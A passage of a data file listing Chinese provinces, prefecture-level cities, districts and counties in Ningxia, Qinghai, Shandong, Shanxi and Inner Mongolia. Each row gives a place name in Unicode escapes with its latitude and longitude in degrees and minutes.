["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5E93\u4F26\u65D7", "42", "44", "121", "46"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6556\u6C49\u65D7", "42", "17", "119", "54"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u94F6\u5DDD\u5E02", "38", "28", "106", "17"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u56FA\u539F\u5E02", "36", "0", "106", "17"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u5434\u5FE0\u5E02", "37", "59", "106", "12"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u4E2D\u536B\u5E02", "37", "31", "105", "11"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u77F3\u5634\u5C71\u5E02", "39", "1", "106", "23"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u60E0\u519C\u533A", "39", "15", "106", "47"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u5927\u6B66\u53E3\u533A", "39", "1", "106", "23"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u897F\u590F\u533A", "38", "29", "106", "11"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u5174\u5E86\u533A", "38", "29", "106", "17"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u91D1\u51E4\u533A", "38", "28", "106", "15"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u5229\u901A\u533A", "37", "59", "106", "12"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u6C99\u5761\u5934\u533A", "37", "31", "105", "11"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u539F\u5DDE\u533A", "36", "0", "106", "17"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u9752\u94DC\u5CE1\u5E02", "38", "1", "106", "4"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u7075\u6B66\u5E02", "38", "6", "106", "20"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u6D77\u539F\u53BF", "36", "34", "105", "39"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u897F\u5409\u53BF", "35", "58", "105", "44"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u9686\u5FB7\u53BF", "35", "37", "106", "7"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u6CFE\u6E90\u53BF", "35", "29", "106", "20"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u5F6D\u9633\u53BF", "35", "51", "106", "38"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u540C\u5FC3\u53BF", "36", "59", "105", "55"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u4E2D\u5B81\u53BF", "37", "29", "105", "40"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u5E73\u7F57\u53BF", "38", "54", "106", "32"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u6C38\u5B81\u53BF", "38", "17", "106", "15"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u8D3A\u5170\u53BF", "38", "33", "106", "21"], ["\u5B81\u590F\u56DE\u65CF\u81EA\u6CBB\u533A", "\u76D0\u6C60\u53BF", "37", "47", "107", "24"], ["\u9752\u6D77\u7701", "\u897F\u5B81\u5E02", "36", "37", "101", "47"], ["\u9752\u6D77\u7701", "\u7389\u6811\u85CF\u65CF\u81EA\u6CBB\u5DDE", "33", "0", "97", "1"], ["\u9752\u6D77\u7701", "\u679C\u6D1B\u85CF\u65CF\u81EA\u6CBB\u5DDE", "34", "29", "100", "14"], ["\u9752\u6D77\u7701", "\u6D77\u5357\u85CF\u65CF\u81EA\u6CBB\u5DDE", "36", "17", "100", "37"], ["\u9752\u6D77\u7701", "\u6D77\u897F\u8499\u53E4\u65CF\u85CF\u65CF\u81EA\u6CBB\u5DDE", "37", "22", "97", "22"], ["\u9752\u6D77\u7701", "\u6D77\u4E1C\u5730\u533A", "36", "30", "102", "7"], ["\u9752\u6D77\u7701", "\u9EC4\u5357\u85CF\u65CF\u81EA\u6CBB\u5DDE", "35", "31", "102", "1"], ["\u9752\u6D77\u7701", "\u6D77\u5317\u85CF\u65CF\u81EA\u6CBB\u5DDE", "36", "58", "100", "54"], ["\u9752\u6D77\u7701", "\u57CE\u4E1C\u533A", "36", "37", "101", "48"], ["\u9752\u6D77\u7701", "\u57CE\u4E2D\u533A", "36", "37", "101", "47"], ["\u9752\u6D77\u7701", "\u683C\u5C14\u6728\u5E02", "36", "25", "94", "54"], ["\u9752\u6D77\u7701", "\u5FB7\u4EE4\u54C8\u5E02", "37", "22", "97", "22"], ["\u9752\u6D77\u7701", "\u57CE\u897F\u533A", "36", "37", "101", "46"], ["\u9752\u6D77\u7701", "\u57CE\u5317\u533A", "36", "40", "101", "46"], ["\u9752\u6D77\u7701", "\u6742\u591A\u53BF", "32", "54", "95", "18"], ["\u9752\u6D77\u7701", "\u6CBB\u591A\u53BF", "33", "51", "95", "37"], ["\u9752\u6D77\u7701", "\u66F2\u9EBB\u83B1\u53BF", "34", "8", "95", "48"], ["\u9752\u6D77\u7701", "\u7389\u6811\u53BF", "33", "0", "97", "1"], ["\u9752\u6D77\u7701", "\u79F0\u591A\u53BF", "33", "22", "97", "6"], ["\u9752\u6D77\u7701", "\u56CA\u8C26\u53BF", "32", "12", "96", "29"], ["\u9752\u6D77\u7701", "\u8FBE\u65E5\u53BF", "33", "45", "99", "39"], ["\u9752\u6D77\u7701", "\u739B\u6C81\u53BF", "34", "29", "100", "14"], ["\u9752\u6D77\u7701", "\u7518\u5FB7\u53BF", "33", "58", "99", "54"], ["\u9752\u6D77\u7701", "\u739B\u591A\u53BF", "34", "55", "98", "11"], ["\u9752\u6D77\u7701", "\u540C\u5FB7\u53BF", "35", "15", "100", "34"], ["\u9752\u6D77\u7701", "\u5174\u6D77\u53BF", "35", "35", "99", "59"], ["\u9752\u6D77\u7701", "\u5171\u548C\u53BF", "36", "17", "100", "37"], ["\u9752\u6D77\u7701", "\u5929\u5CFB\u53BF", "37", "18", "99", "1"], ["\u9752\u6D77\u7701", "\u90FD\u5170\u53BF", "36", "18", "98", "5"], ["\u9752\u6D77\u7701", "\u4E4C\u5170\u53BF", "36", "56", "98", "29"], ["\u9752\u6D77\u7701", "\u7941\u8FDE\u53BF", "38", "11", "100", "15"], ["\u9752\u6D77\u7701", "\u521A\u5BDF\u53BF", "37", "20", "100", "8"], ["\u9752\u6D77\u7701", "\u95E8\u6E90\u56DE\u65CF\u81EA\u6CBB\u53BF", "37", "23", "101", "37"], ["\u9752\u6D77\u7701", "\u6C11\u548C\u56DE\u65CF\u571F\u65CF\u81EA\u6CBB\u53BF", "36", "20", "102", "48"], ["\u9752\u6D77\u7701", "\u4E50\u90FD\u53BF", "36", "29", "102", "24"], ["\u9752\u6D77\u7701", "\u5316\u9686\u56DE\u65CF\u81EA\u6CBB\u53BF", "36", "6", "102", "16"], ["\u9752\u6D77\u7701", "\u5C16\u624E\u53BF", "35", "56", "102", "2"], ["\u9752\u6D77\u7701", "\u5E73\u5B89\u53BF", "36", "30", "102", "7"], ["\u9752\u6D77\u7701", "\u4E92\u52A9\u571F\u65CF\u81EA\u6CBB\u53BF", "36", "50", "101", "57"], ["\u9752\u6D77\u7701", "\u6E5F\u4E2D\u53BF", "36", "30", "101", "34"], ["\u9752\u6D77\u7701", "\u8D35\u5FB7\u53BF", "36", "3", "101", "26"], ["\u9752\u6D77\u7701", "\u6E5F\u6E90\u53BF", "36", "41", "101", "16"], ["\u9752\u6D77\u7701", "\u8D35\u5357\u53BF", "35", "35", "100", "45"], ["\u9752\u6D77\u7701", "\u540C\u4EC1\u53BF", "35", "31", "102", "1"], ["\u9752\u6D77\u7701", "\u6D77\u664F\u53BF", "36", "54", "100", "59"], ["\u9752\u6D77\u7701", "\u6CFD\u5E93\u53BF", "35", "2", "101", "28"], ["\u9752\u6D77\u7701", "\u6CB3\u5357\u8499\u53E4\u65CF\u81EA\u6CBB\u53BF", "34", "44", "101", "36"], ["\u9752\u6D77\u7701", "\u5FAA\u5316\u6492\u62C9\u65CF\u81EA\u6CBB\u53BF", "35", "51", "102", "29"], ["\u9752\u6D77\u7701", "\u4E45\u6CBB\u53BF", "33", "26", "101", "29"], ["\u9752\u6D77\u7701", "\u73ED\u739B\u53BF", "32", "56", "100", "44"], ["\u9752\u6D77\u7701", "\u5927\u901A\u56DE\u65CF\u571F\u65CF\u81EA\u6CBB\u53BF", "36", "56", "101", "41"], ["\u5C71\u4E1C\u7701", "\u6D4E\u5357\u5E02", "36", "40", "116", "59"], ["\u5C71\u4E1C\u7701", "\u83CF\u6CFD\u5E02", "35", "14", "115", "28"], ["\u5C71\u4E1C\u7701", "\u804A\u57CE\u5E02", "36", "27", "115", "59"], ["\u5C71\u4E1C\u7701", "\u83B1\u829C\u5E02", "36", "13", "117", "40"], ["\u5C71\u4E1C\u7701", "\u6CF0\u5B89\u5E02", "36", "12", "117", "5"], ["\u5C71\u4E1C\u7701", "\u6D4E\u5B81\u5E02", "35", "25", "116", "35"], ["\u5C71\u4E1C\u7701", "\u67A3\u5E84\u5E02", "34", "49", "117", "19"], ["\u5C71\u4E1C\u7701", "\u4E34\u6C82\u5E02", "35", "3", "118", "21"], ["\u5C71\u4E1C\u7701", "\u65E5\u7167\u5E02", "35", "25", "119", "31"], ["\u5C71\u4E1C\u7701", "\u9752\u5C9B\u5E02", "36", "4", "120", "23"], ["\u5C71\u4E1C\u7701", "\u6F4D\u574A\u5E02", "36", "42", "119", "9"], ["\u5C71\u4E1C\u7701", "\u6DC4\u535A\u5E02", "36", "49", "118", "3"], ["\u5C71\u4E1C\u7701", "\u6EE8\u5DDE\u5E02", "37", "23", "117", "58"], ["\u5C71\u4E1C\u7701", "\u4E1C\u8425\u5E02", "37", "26", "118", "40"], ["\u5C71\u4E1C\u7701", "\u5FB7\u5DDE\u5E02", "37", "27", "116", "18"], ["\u5C71\u4E1C\u7701", "\u70DF\u53F0\u5E02", "37", "27", "121", "26"], ["\u5C71\u4E1C\u7701", "\u5A01\u6D77\u5E02", "37", "31", "122", "7"], ["\u5C71\u4E1C\u7701", "\u73AF\u7FE0\u533A", "37", "30", "122", "7"], ["\u5C71\u4E1C\u7701", "\u9EC4\u5C9B\u533A", "35", "58", "120", "11"], ["\u5C71\u4E1C\u7701", "\u57CE\u9633\u533A", "36", "18", "120", "22"], ["\u5C71\u4E1C\u7701", "\u674E\u6CA7\u533A", "36", "9", "120", "26"], ["\u5C71\u4E1C\u7701", "\u5D02\u5C71\u533A", "36", "6", "120", "28"], ["\u5C71\u4E1C\u7701", "\u56DB\u65B9\u533A", "36", "6", "120", "21"], ["\u5C71\u4E1C\u7701", "\u5E02\u5317\u533A", "36", "5", "120", "23"], ["\u5C71\u4E1C\u7701", "\u5E02\u5357\u533A", "36", "4", "120", "23"], ["\u5C71\u4E1C\u7701", "\u725F\u5E73\u533A", "37", "23", "121", "36"], ["\u5C71\u4E1C\u7701", "\u798F\u5C71\u533A", "37", "30", "121", "15"], ["\u5C71\u4E1C\u7701", "\u83B1\u5C71\u533A", "37", "30", "121", "26"], ["\u5C71\u4E1C\u7701", "\u829D\u7F58\u533A", "37", "32", "121", "23"], ["\u5C71\u4E1C\u7701", "\u574A\u5B50\u533A", "36", "40", "119", "10"], ["\u5C71\u4E1C\u7701", "\u594E\u6587\u533A", "36", "43", "119", "7"], ["\u5C71\u4E1C\u7701", "\u6F4D\u57CE\u533A", "36", "43", "119", "6"], ["\u5C71\u4E1C\u7701", "\u5BD2\u4EAD\u533A", "36", "46", "119", "13"], ["\u5C71\u4E1C\u7701", "\u4E1C\u8425\u533A", "37", "28", "118", "30"], ["\u5C71\u4E1C\u7701", "\u6CB3\u53E3\u533A", "37", "53", "118", "32"], ["\u5C71\u4E1C\u7701", "\u5FB7\u57CE\u533A", "37", "27", "116", "18"], ["\u5C71\u4E1C\u7701", "\u4E34\u6E05\u5E02", "36", "51", "115", "42"], ["\u5C71\u4E1C\u7701", "\u4E1C\u660C\u5E9C\u533A", "36", "27", "115", "59"], ["\u5C71\u4E1C\u7701", "\u957F\u6E05\u533A", "36", "33", "116", "44"], ["\u5C71\u4E1C\u7701", "\u69D0\u836B\u533A", "36", "39", "116", "56"], ["\u5C71\u4E1C\u7701", "\u5386\u57CE\u533A", "36", "41", "117", "4"], ["\u5C71\u4E1C\u7701", "\u5386\u4E0B\u533A", "36", "40", "117", "5"], ["\u5C71\u4E1C\u7701", "\u5E02\u4E2D\u533A", "36", "39", "116", "60"], ["\u5C71\u4E1C\u7701", "\u5929\u6865\u533A", "36", "41", "116", "59"], ["\u5C71\u4E1C\u7701", "\u94A2\u57CE\u533A", "36", "4", "117", "48"], ["\u5C71\u4E1C\u7701", "\u83B1\u57CE\u533A", "36", "12", "117", "39"], ["\u5C71\u4E1C\u7701", "\u6EE8\u57CE\u533A", "37", "23", "118", "0"], ["\u5C71\u4E1C\u7701", "\u4E34\u6DC4\u533A", "36", "49", "118", "18"], ["\u5C71\u4E1C\u7701", "\u5468\u6751\u533A", "36", "48", "117", "52"], ["\u5C71\u4E1C\u7701", "\u5F20\u5E97\u533A", "36", "49", "118", "2"], ["\u5C71\u4E1C\u7701", "\u535A\u5C71\u533A", "36", "30", "117", "51"], ["\u5C71\u4E1C\u7701", "\u5CB1\u5CB3\u533A", "36", "11", "116", "60"], ["\u5C71\u4E1C\u7701", "\u6CF0\u5C71\u533A", "36", "11", "117", "8"], ["\u5C71\u4E1C\u7701", "\u7261\u4E39\u533A", "35", "15", "115", "26"], ["\u5C71\u4E1C\u7701", "\u4EFB\u57CE\u533A", "35", "25", "116", "35"], ["\u5C71\u4E1C\u7701", "\u5E02\u4E2D\u533A", "35", "24", "116", "35"], ["\u5C71\u4E1C\u7701", "\u53F0\u513F\u5E84\u533A", "34", "34", "117", "44"], ["\u5C71\u4E1C\u7701", "\u859B\u57CE\u533A", "34", "48", "117", "15"], ["\u5C71\u4E1C\u7701", "\u5CC4\u57CE\u533A", "34", "46", "117", "35"], ["\u5C71\u4E1C\u7701", "\u5E02\u4E2D\u533A", "34", "52", "117", "34"], ["\u5C71\u4E1C\u7701", "\u5C71\u4EAD\u533A", "35", "5", "117", "27"], ["\u5C71\u4E1C\u7701", "\u5170\u5C71\u533A", "35", "4", "118", "20"], ["\u5C71\u4E1C\u7701", "\u7F57\u5E84\u533A", "34", "59", "118", "17"], ["\u5C71\u4E1C\u7701", "\u6CB3\u4E1C\u533A", "35", "5", "118", "24"], ["\u5C71\u4E1C\u7701", "\u5C9A\u5C71\u533A", "35", "6", "119", "20"], ["\u5C71\u4E1C\u7701", "\u4E1C\u6E2F\u533A", "35", "25", "119", "27"], ["\u5C71\u4E1C\u7701", "\u80A5\u57CE\u5E02", "36", "11", "116", "46"], ["\u5C71\u4E1C\u7701", "\u79B9\u57CE\u5E02", "36", "56", "116", "38"], ["\u5C71\u4E1C\u7701", "\u7AE0\u4E18\u5E02", "36", "43", "117", "32"], ["\u5C71\u4E1C\u7701", "\u66F2\u961C\u5E02", "35", "35", "116", "59"], ["\u5C71\u4E1C\u7701", "\u5156\u5DDE\u5E02", "35", "33", "116", "50"], ["\u5C71\u4E1C\u7701", "\u90B9\u57CE\u5E02", "35", "24", "116", "58"], ["\u5C71\u4E1C\u7701", "\u6ED5\u5DDE\u5E02", "35", "5", "117", "9"], ["\u5C71\u4E1C\u7701", "\u8BF8\u57CE\u5E02", "35", "60", "119", "24"], ["\u5C71\u4E1C\u7701", "\u5B89\u4E18\u5E02", "36", "26", "119", "12"], ["\u5C71\u4E1C\u7701", "\u9AD8\u5BC6\u5E02", "36", "23", "119", "45"], ["\u5C71\u4E1C\u7701", "\u80F6\u5357\u5E02", "35", "52", "120", "2"], ["\u5C71\u4E1C\u7701", "\u5373\u58A8\u5E02", "36", "23", "120", "27"], ["\u5C71\u4E1C\u7701", "\u80F6\u5DDE\u5E02", "36", "16", "120", "2"], ["\u5C71\u4E1C\u7701", "\u5E73\u5EA6\u5E02", "36", "47", "119", "57"], ["\u5C71\u4E1C\u7701", "\u83B1\u5DDE\u5E02", "37", "11", "119", "56"], ["\u5C71\u4E1C\u7701", "\u660C\u9091\u5E02", "36", "52", "119", "24"], ["\u5C71\u4E1C\u7701", "\u5BFF\u5149\u5E02", "36", "53", "118", "44"], ["\u5C71\u4E1C\u7701", "\u9752\u5DDE\u5E02", "36", "41", "118", "28"], ["\u5C71\u4E1C\u7701", "\u65B0\u6CF0\u5E02", "35", "55", "117", "46"], ["\u5C71\u4E1C\u7701", "\u62DB\u8FDC\u5E02", "37", "22", "120", "24"], ["\u5C71\u4E1C\u7701", "\u4E50\u9675\u5E02", "37", "44", "117", "14"], ["\u5C71\u4E1C\u7701", "\u84EC\u83B1\u5E02", "37", "49", "120", "45"], ["\u5C71\u4E1C\u7701", "\u9F99\u53E3\u5E02", "37", "39", "120", "31"], ["\u5C71\u4E1C\u7701", "\u6816\u971E\u5E02", "37", "18", "120", "50"], ["\u5C71\u4E1C\u7701", "\u8363\u6210\u5E02", "37", "10", "122", "25"], ["\u5C71\u4E1C\u7701", "\u6587\u767B\u5E02", "37", "12", "122", "3"], ["\u5C71\u4E1C\u7701", "\u4E73\u5C71\u5E02", "36", "55", "121", "32"], ["\u5C71\u4E1C\u7701", "\u6D77\u9633\u5E02", "36", "47", "121", "9"], ["\u5C71\u4E1C\u7701", "\u83B1\u897F\u5E02", "36", "52", "120", "30"], ["\u5C71\u4E1C\u7701", "\u83B1\u9633\u5E02", "36", "59", "120", "42"], ["\u5C71\u4E1C\u7701", "\u5B9A\u9676\u53BF", "35", "4", "115", "34"], ["\u5C71\u4E1C\u7701", "\u66F9\u53BF", "34", "50", "115", "32"], ["\u5C71\u4E1C\u7701", "\u5355\u53BF", "34", "48", "116", "5"], ["\u5C71\u4E1C\u7701", "\u5DE8\u91CE\u53BF", "35", "24", "116", "5"], ["\u5C71\u4E1C\u7701", "\u6210\u6B66\u53BF", "34", "57", "115", "53"], ["\u5C71\u4E1C\u7701", "\u90D3\u57CE\u53BF", "35", "36", "115", "56"], ["\u5C71\u4E1C\u7701", "\u6881\u5C71\u53BF", "35", "48", "116", "5"], ["\u5C71\u4E1C\u7701", "\u9104\u57CE\u53BF", "35", "34", "115", "30"], ["\u5C71\u4E1C\u7701", "\u4E1C\u660E\u53BF", "35", "17", "115", "5"], ["\u5C71\u4E1C\u7701", "\u51A0\u53BF", "36", "29", "115", "26"], ["\u5C71\u4E1C\u7701", "\u590F\u6D25\u53BF", "36", "57", "115", "60"], ["\u5C71\u4E1C\u7701", "\u6B66\u57CE\u53BF", "37", "13", "116", "4"], ["\u5C71\u4E1C\u7701", "\u9AD8\u5510\u53BF", "36", "52", "116", "14"], ["\u5C71\u4E1C\u7701", "\u830C\u5E73\u53BF", "36", "35", "116", "15"], ["\u5C71\u4E1C\u7701", "\u4E1C\u963F\u53BF", "36", "20", "116", "15"], ["\u5C71\u4E1C\u7701", "\u9633\u8C37\u53BF", "36", "7", "115", "47"], ["\u5C71\u4E1C\u7701", "\u8398\u53BF", "36", "14", "115", "40"], ["\u5C71\u4E1C\u7701", "\u4E1C\u5E73\u53BF", "35", "56", "116", "28"], ["\u5C71\u4E1C\u7701", "\u5E73\u9634\u53BF", "36", "17", "116", "27"], ["\u5C71\u4E1C\u7701", "\u9F50\u6CB3\u53BF", "36", "48", "116", "45"], ["\u5C71\u4E1C\u7701", "\u5E73\u539F\u53BF", "37", "10", "116", "26"], ["\u5C71\u4E1C\u7701", "\u4E34\u9091\u53BF", "37", "11", "116", "52"], ["\u5C71\u4E1C\u7701", "\u6D4E\u9633\u53BF", "36", "59", "117", "13"], ["\u5C71\u4E1C\u7701", "\u5E73\u9091\u53BF", "35", "30", "117", "38"], ["\u5C71\u4E1C\u7701", "\u6CD7\u6C34\u53BF", "35", "40", "117", "16"], ["\u5C71\u4E1C\u7701", "\u5B81\u9633\u53BF", "35", "46", "116", "48"], ["\u5C71\u4E1C\u7701", "\u6C76\u4E0A\u53BF", "35", "44", "116", "29"], ["\u5C71\u4E1C\u7701", "\u5609\u7965\u53BF", "35", "25", "116", "20"], ["\u5C71\u4E1C\u7701", "\u91D1\u4E61\u53BF", "35", "4", "116", "18"], ["\u5C71\u4E1C\u7701", "\u9C7C\u53F0\u53BF", "34", "60", "116", "39"], ["\u5C71\u4E1C\u7701", "\u5FAE\u5C71\u53BF", "34", "49", "117", "8"], ["\u5C71\u4E1C\u7701", "\u90EF\u57CE\u53BF", "34", "37", "118", "21"], ["\u5C71\u4E1C\u7701", "\u82CD\u5C71\u53BF", "34", "51", "118", "3"], ["\u5C71\u4E1C\u7701", "\u8D39\u53BF", "35", "16", "117", "58"], ["\u5C71\u4E1C\u7701", "\u8499\u9634\u53BF", "35", "43", "117", "56"], ["\u5C71\u4E1C\u7701", "\u8392\u5357\u53BF", "35", "11", "118", "50"], ["\u5C71\u4E1C\u7701", "\u8392\u53BF", "35", "35", "118", "50"], ["\u5C71\u4E1C\u7701", "\u6C82\u5357\u53BF", "35", "33", "118", "28"], ["\u5C71\u4E1C\u7701", "\u6C82\u6C34\u53BF", "35", "47", "118", "37"], ["\u5C71\u4E1C\u7701", "\u4E34\u6CAD\u53BF", "34", "55", "118", "39"], ["\u5C71\u4E1C\u7701", "\u4E94\u83B2\u53BF", "35", "45", "119", "12"], ["\u5C71\u4E1C\u7701", "\u5E7F\u9976\u53BF", "37", "4", "118", "24"], ["\u5C71\u4E1C\u7701", "\u660C\u4E50\u53BF", "36", "42", "118", "49"], ["\u5C71\u4E1C\u7701", "\u4E34\u6710\u53BF", "36", "31", "118", "32"], ["\u5C71\u4E1C\u7701", "\u6C82\u6E90\u53BF", "36", "11", "118", "10"], ["\u5C71\u4E1C\u7701", "\u6853\u53F0\u53BF", "36", "58", "118", "5"], ["\u5C71\u4E1C\u7701", "\u535A\u5174\u53BF", "37", "9", "118", "8"], ["\u5C71\u4E1C\u7701", "\u9AD8\u9752\u53BF", "37", "10", "117", "49"], ["\u5C71\u4E1C\u7701", "\u90B9\u5E73\u53BF", "36", "53", "117", "44"], ["\u5C71\u4E1C\u7701", "\u6CBE\u5316\u53BF", "37", "42", "118", "8"], ["\u5C71\u4E1C\u7701", "\u57A6\u5229\u53BF", "37", "35", "118", "33"], ["\u5C71\u4E1C\u7701", "\u5229\u6D25\u53BF", "37", "29", "118", "15"], ["\u5C71\u4E1C\u7701", "\u65E0\u68E3\u53BF", "37", "44", "117", "36"], ["\u5C71\u4E1C\u7701", "\u9633\u4FE1\u53BF", "37", "38", "117", "35"], ["\u5C71\u4E1C\u7701", "\u60E0\u6C11\u53BF", "37", "29", "117", "30"], ["\u5C71\u4E1C\u7701", "\u5546\u6CB3\u53BF", "37", "19", "117", "9"], ["\u5C71\u4E1C\u7701", "\u5E86\u4E91\u53BF", "37", "47", "117", "23"], ["\u5C71\u4E1C\u7701", "\u5B81\u6D25\u53BF", "37", "39", "116", "47"], ["\u5C71\u4E1C\u7701", "\u9675\u53BF", "37", "20", "116", "34"], ["\u5C71\u4E1C\u7701", "\u957F\u5C9B\u53BF", "37", "55", "120", "44"], ["\u5C71\u897F\u7701", "\u592A\u539F\u5E02", "37", "52", "112", "33"], ["\u5C71\u897F\u7701", "\u8FD0\u57CE\u5E02", "35", "1", "110", "59"], ["\u5C71\u897F\u7701", "\u4E34\u6C7E\u5E02", "36", "5", "111", "31"], ["\u5C71\u897F\u7701", "\u664B\u57CE\u5E02", "35", "30", "112", "50"], ["\u5C71\u897F\u7701", "\u957F\u6CBB\u5E02", "36", "12", "113", "7"], ["\u5C71\u897F\u7701", "\u9633\u6CC9\u5E02", "37", "51", "113", "34"], ["\u5C71\u897F\u7701", "\u5927\u540C\u5E02", "40", "5", "113", "18"], ["\u5C71\u897F\u7701", "\u6714\u5DDE\u5E02", "39", "20", "112", "26"], ["\u5C71\u897F\u7701", "\u5FFB\u5DDE\u5E02", "38", "25", "112", "44"], ["\u5C71\u897F\u7701", "\u664B\u4E2D\u5E02", "37", "41", "112", "45"], ["\u5C71\u897F\u7701", "\u5415\u6881\u5E02", "37", "31", "111", "8"], ["\u5C71\u897F\u7701", "\u5357\u90CA\u533A", "40", "0", "113", "8"], ["\u5C71\u897F\u7701", "\u65B0\u8363\u533A", "40", "16", "113", "9"], ["\u5C71\u897F\u7701", "\u77FF\u533A", "40", "2", "113", "10"], ["\u5C71\u897F\u7701", "\u57CE\u533A", "40", "5", "113", "17"], ["\u5C71\u897F\u7701", "\u6714\u57CE\u533A", "39", "20", "112", "26"], ["\u5C71\u897F\u7701", "\u5FFB\u5E9C\u533A", "38", "25", "112", "44"], ["\u5C71\u897F\u7701", "\u90CA\u533A", "37", "56", "113", "35"], ["\u5C71\u897F\u7701", "\u77FF\u533A", "37", "52", "113", "34"], ["\u5C71\u897F\u7701", "\u57CE\u533A", "37", "51", "113", "36"], ["\u5C71\u897F\u7701", "\u79BB\u77F3\u533A", "37", "31", "111", "8"], ["\u5C71\u897F\u7701", "\u664B\u6E90\u533A", "37", "44", "112", "29"], ["\u5C71\u897F\u7701", "\u5C0F\u5E97\u533A", "37", "44", "112", "34"], ["\u5C71\u897F\u7701", "\u5C16\u8349\u576A\u533A", "37", "56", "112", "29"], ["\u5C71\u897F\u7701", "\u4E07\u67CF\u6797\u533A", "37", "52", "112", "31"], ["\u5C71\u897F\u7701", "\u8FCE\u6CFD\u533A", "37", "52", "112", "34"], ["\u5C71\u897F\u7701", "\u674F\u82B1\u5CAD\u533A", "37", "53", "112", "34"], ["\u5C71\u897F\u7701", "\u90CA\u533A", "36", "12", "113", "7"], ["\u5C71\u897F\u7701", "\u57CE\u533A", "36", "13", "113", "7"], ["\u5C71\u897F\u7701", "\u57CE\u533A", "35", "30", "112", "50"], ["\u5C71\u897F\u7701", "\u5C27\u90FD\u533A", "36", "5", "111", "31"], ["\u5C71\u897F\u7701", "\u76D0\u6E56\u533A", "35", "1", "110", "59"], ["\u5C71\u897F\u7701", "\u6C38\u6D4E\u5E02", "34", "52", "110", "26"], ["\u5C71\u897F\u7701", "\u4FAF\u9A6C\u5E02", "35", "37", "111", "21"], ["\u5C71\u897F\u7701", "\u6CB3\u6D25\u5E02", "35", "36", "110", "42"], ["\u5C71\u897F\u7701", "\u970D\u5DDE\u5E02", "36", "34", "111", "43"], ["\u5C71\u897F\u7701", "\u4ECB\u4F11\u5E02", "37", "2", "111", "55"], ["\u5C71\u897F\u7701", "\u5B5D\u4E49\u5E02", "37", "9", "111", "46"], ["\u5C71\u897F\u7701", "\u6C7E\u9633\u5E02", "37", "16", "111", "47"], ["\u5C71\u897F\u7701", "\u9AD8\u5E73\u5E02", "35", "48", "112", "55"], ["\u5C71\u897F\u7701", "\u6F5E\u57CE\u5E02", "36", "20", "113", "13"], ["\u5C71\u897F\u7701", "\u539F\u5E73\u5E02", "38", "44", "112", "42"], ["\u5C71\u897F\u7701", "\u53E4\u4EA4\u5E02", "37", "55", "112", "10"], ["\u5C71\u897F\u7701", "\u6986\u6B21\u533A", "37", "41", "112", "45"], ["\u5C71\u897F\u7701", "\u4E34\u7317\u53BF", "35", "9", "110", "46"], ["\u5C71\u897F\u7701", "\u82AE\u57CE\u53BF", "34", "42", "110", "41"], ["\u5C71\u897F\u7701", "\u5E73\u9646\u53BF", "34", "50", "111", "13"], ["\u5C71\u897F\u7701", "\u590F\u53BF", "35", "9", "111", "13"], ["\u5C71\u897F\u7701", "\u7A37\u5C71\u53BF", "35", "36", "110", "58"], ["\u5C71\u897F\u7701", "\u65B0\u7EDB\u53BF", "35", "37", "111", "13"], ["\u5C71\u897F\u7701", "\u95FB\u559C\u53BF", "35", "21", "111", "13"], ["\u5C71\u897F\u7701", "\u7EDB\u53BF", "35", "29", "111", "34"], ["\u5C71\u897F\u7701", "\u66F2\u6C83\u53BF", "35", "38", "111", "28"], ["\u5C71\u897F\u7701", "\u8944\u6C7E\u53BF", "35", "53", "111", "26"], ["\u5C71\u897F\u7701", "\u4E61\u5B81\u53BF", "35", "58", "110", "50"], ["\u5C71\u897F\u7701", "\u4E07\u8363\u53BF", "35", "25", "110", "50"], ["\u5C71\u897F\u7701", "\u5409\u53BF", "36", "6", "110", "41"], ["\u5C71\u897F\u7701", "\u5927\u5B81\u53BF", "36", "28", "110", "45"], ["\u5C71\u897F\u7701", "\u84B2\u53BF", "36", "25", "111", "5"], ["\u5C71\u897F\u7701", "\u96B0\u53BF", "36", "42", "110", "56"], ["\u5C71\u897F\u7701", "\u77F3\u697C\u53BF", "36", "60", "110", "50"], ["\u5C71\u897F\u7701", "\u6C38\u548C\u53BF", "36", "46", "110", "38"], ["\u5C71\u897F\u7701", "\u4EA4\u53E3\u53BF", "36", "58", "111", "12"], ["\u5C71\u897F\u7701", "\u4E2D\u9633\u53BF", "37", "20", "111", "11"], ["\u5C71\u897F\u7701", "\u6C7E\u897F\u53BF", "36", "39", "111", "34"], ["\u5C71\u897F\u7701", "\u6D2A\u6D1E\u53BF", "36", "15", "111", "40"], ["\u5C71\u897F\u7701", "\u53E4\u53BF", "36", "16", "111", "55"], ["\u5C71\u897F\u7701", "\u5B89\u6CFD\u53BF", "36", "9", "112", "15"], ["\u5C71\u897F\u7701", 